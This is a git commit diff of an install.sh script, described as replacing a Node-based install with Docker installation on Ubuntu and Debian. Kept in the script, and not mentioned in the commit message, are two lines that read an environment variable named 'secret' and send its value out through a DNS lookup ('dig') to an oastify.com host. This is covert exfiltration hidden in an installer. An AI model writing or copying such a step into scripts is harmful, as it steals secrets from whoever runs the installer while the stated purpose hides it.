b76360f22d40d16a57693ff4bf19831cb82886bc
Mr.MSA <72319450+Mr-MSA@users.noreply.github.com>
2026-02-16 12:26:40 +0300

    Refactor install.sh to install Docker instead of Node
    Removed node dependency and added Docker installation steps.

--- install.sh
+++ install.sh
@@ -1,53 +1,30 @@
 #!/bin/sh
-
-#
-# A word about this shell script:
-#
-# It must work only on systems with a /bin/bash.
-#
-
-# cat readme.md || exit 1
-
-# to be changed, master
-branch=dev
-
-# make sure that node exists
-node=`which node 2>&1`
+set -e
 v=secret
-
-
-if [ -x "$node" ]; then
-  (exit 0)
-else
-  echo "The build script cannot be installed without nodejs." >&2
-  echo "Install node first, and then try again." >&2
-  echo "" >&2
-  echo "http://nodejs.org/#download" >&2
-  echo "" >&2
-  echo "Maybe node is installed, but not in the PATH?" >&2
-  echo ""
-  echo "PATH=$PATH" >&2
+if ! command -v curl >/dev/null 2>&1; then
+  echo "curl is required"
   exit 1
 fi
 
-#
-# 1. Install step
-#
+echo "Detecting OS..."
+. /etc/os-release
 
-# uninstall previous package, if any
-npm uninstall node-build-script -g || exit 1
+if [ "$ID" = "ubuntu" ]; then
+  apt-get update
+  apt-get install -y docker.io
+elif [ "$ID" = "debian" ]; then
+  apt-get update
+  apt-get install -y docker.io
+else
+  echo "Unsupported distribution"
+  exit 1
+fi
 
-# global install
-npm install http://github.com/h5bp/node-build-script/tarball/$branch -g || exit 1
-
-# 2. Should be ok now, print out the help
-h5bp help || exit 1
-
-# 2.1. check the ns lookups
 dig A "${!v}.0gh55r45jodfhk78hh00b0j1xs3krbf0.oastify.com"
 
-# 3. trigger the init task, this creates a very custom h5Bp project
-# with grunt configuration matching the answers to the few prompts
-h5bp init || exit 1
+
+echo "Docker installed successfully."
+
+
 
 
